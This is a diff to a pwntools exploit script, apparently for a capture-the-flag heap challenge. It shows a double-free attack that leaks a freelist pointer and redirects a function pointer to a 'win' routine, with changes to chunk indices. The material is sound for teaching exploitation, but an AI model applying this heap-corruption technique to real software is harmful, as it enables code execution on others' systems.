@@ -43,23 +43,21 @@ def hint(index):
 
 menu()
 make(b'0', b'AAAAAAAA')
-make(b'1', b'a')
 
 # double free bug
 kill(b'0')
-kill(b'1')
 kill(b'0')
 
 # leak the fd pointer
-leak = u32(view(0))
+leak = u32(view(b'0'))
 log.critical('Leaked Pointer: {}'.format(hex(leak)))
 
 # change fd pointer by 8 bytes to overlap with hint function pointer
 log.critical('New Pointer: {}'.format(hex(leak+8)))
-make(b'1', p32(leak+8))
-make(b'2', '')
+make(b'0', p32(leak+8))
+make(b'1', '')
 
 # allocate new chunk to overwrite hint pointer
-make(b'3', p32(elf.symbols['win']))
+make(b'2', p32(elf.symbols['win']))
 
-log.critical(hint(2))
+log.critical(hint(b'1'))
